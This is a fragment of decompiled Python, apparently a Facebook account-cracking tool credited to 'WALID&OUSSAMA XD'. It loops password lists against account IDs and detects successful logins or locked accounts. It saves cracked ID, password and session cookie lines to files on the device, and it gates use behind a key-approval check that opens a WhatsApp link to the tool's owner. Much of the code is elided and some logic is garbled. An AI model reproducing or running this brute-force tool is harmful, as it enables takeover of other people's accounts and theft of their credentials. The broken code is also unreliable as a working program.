"""
//DECOMPILED BY WALID&OUSSAMA XD
@@FACEBOOK : S.walid / OUSSAMA SEBTI
"""
        ...
        try:
            ...
            for pw in passlist:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/SABTI-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/SABTI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 linex()
                 ok+=1
                 open("/sdcard/SABTI-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.SABTI.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/SABTI.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    ...
    r1 = requests.get('https://www.facebook.com/profile.php?id=100094453810993').text
    ...
    if key1 in r1:
        ...
        tks = ('https://www.facebook.com/profile.php?id=100094453810993%20DOD%20Owner%2-XD%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+923239021979?text='+tks)
        main_apv()
main_apv()
